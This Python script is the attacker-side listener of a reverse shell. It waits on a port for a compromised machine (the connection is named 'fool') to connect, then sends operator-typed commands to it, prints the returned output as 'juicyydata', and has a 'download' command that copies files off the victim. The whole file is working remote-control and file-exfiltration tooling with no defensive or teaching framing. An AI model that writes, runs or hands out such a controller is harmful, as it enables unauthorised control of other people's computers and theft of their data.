import socket 
import colorama 

colorama.init()

LHOST = '127.0.0.1'
LPORT = 9594

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
sock.listen(1)
print('Keeping an eye out on port', LPORT )
fool, addr = sock.accept()

while True: 
    the_beginning = fool.recv(1024)
    instruct = input(the_beginning.decode()).encode()

    if instruct.decode('utf-8').split(' ')[0] == 'download':
        name = instruct.decode('utf-8').split(' ')[1][::-1]
        fool.send(instruct)
        with open(name, 'wb') as f:
            examine = fool.recv(1024)
            while examine:
                f.write(examine)
                examine = fool.recv(1024)
                if examine == b"DONE":
                    break
            
    if instruct == b'':
        print('I am yours to command...')
    else:
        fool.send(instruct)
        juicyydata = fool.recv(1024).decode('utf-8')
        if juicyydata == 'exit':
            print('Bye Bye!', addr[0])
            break
        print(juicyydata)
fool.close()
sock.close
